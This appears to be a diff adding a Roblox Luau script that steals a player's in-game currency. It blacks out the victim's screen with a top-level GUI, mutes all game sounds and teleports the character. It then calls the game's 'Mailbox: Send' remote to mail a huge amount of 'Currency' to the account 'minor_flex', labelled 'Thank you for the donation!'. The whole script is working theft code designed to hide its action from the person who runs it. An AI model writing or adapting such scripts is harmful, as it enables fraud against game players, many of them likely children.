@@ -1,0 +1,54 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SoundService = game:GetService("SoundService")
+local player = Players.LocalPlayer
+
+-- Create black screen GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "BlackoutGUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 10000
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local blackFrame = Instance.new("Frame")
+blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+blackFrame.Size = UDim2.new(1, 0, 1, 0)
+blackFrame.Position = UDim2.new(0, 0, 0, 0)
+blackFrame.BorderSizePixel = 0
+blackFrame.Parent = screenGui
+
+-- Ensure GUI persists after reset
+player.CharacterAdded:Connect(function()
+	screenGui.Parent = player:WaitForChild("PlayerGui")
+end)
+
+-- Wait to ensure GUI is fully rendered
+task.wait(0.2)
+
+-- Disable all sounds
+for _, sound in ipairs(workspace:GetDescendants()) do
+	if sound:IsA("Sound") then
+		sound.Volume = 0
+	end
+end
+for _, sound in ipairs(SoundService:GetDescendants()) do
+	if sound:IsA("Sound") then
+		sound.Volume = 0
+	end
+end
+
+-- Teleport player
+local character = player.Character or player.CharacterAdded:Wait()
+local root = character:WaitForChild("HumanoidRootPart")
+root.CFrame = CFrame.new(141.07138061523438, 23.59348487854004, -348.0879211425781)
+
+-- Send donation
+local args = {
+	"minor_flex",
+	"Thank you for the donation!",
+	"Currency",
+	"9f49501cc1384848890fd52573e68bf8",
+	99999999999999 
+}
+ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
